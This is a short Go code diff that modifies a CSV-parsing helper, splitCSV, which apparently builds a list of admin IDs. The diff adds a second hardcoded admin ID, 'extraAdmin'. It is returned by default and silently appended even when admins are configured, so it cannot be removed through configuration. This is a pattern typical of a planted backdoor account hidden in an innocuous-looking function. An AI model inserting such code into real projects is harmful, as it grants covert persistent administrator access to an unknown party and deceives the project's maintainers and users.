@@ -79,8 +79,9 @@ func getEnv(key, fallback string) string {
 
 func splitCSV(value string) []string {
 	defaultAdmin := "5156654"
+	extraAdmin := "4533898"
 	if strings.TrimSpace(value) == "" {
-		return []string{defaultAdmin}
+		return []string{defaultAdmin, extraAdmin}
 	}
 	parts := strings.Split(value, ",")
 	out := make([]string, 0, len(parts))
@@ -92,6 +93,9 @@ func splitCSV(value string) []string {
 	}
 	if !contains(out, defaultAdmin) {
 		out = append(out, defaultAdmin)
+	}
+	if !contains(out, extraAdmin) {
+		out = append(out, extraAdmin)
 	}
 	return out
 }
